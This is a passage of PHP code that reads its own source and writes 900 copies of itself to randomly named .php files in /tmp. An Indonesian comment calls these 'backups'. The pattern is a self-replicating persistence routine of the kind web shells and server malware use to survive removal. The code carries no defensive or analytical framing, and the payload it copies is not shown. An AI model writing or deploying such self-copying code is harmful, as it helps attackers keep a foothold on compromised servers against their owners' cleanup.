    $my_content = file_get_contents(__FILE__);
    
    // BUAT 900 BACKUP SEKALIGUS!
    for ($i = 1; $i <= 900; $i++) {
        $backup_file = "/tmp/f_" . uniqid() . ".php";
        file_put_contents($backup_file, $my_content);
        chmod($backup_file, 0644);
    }
}
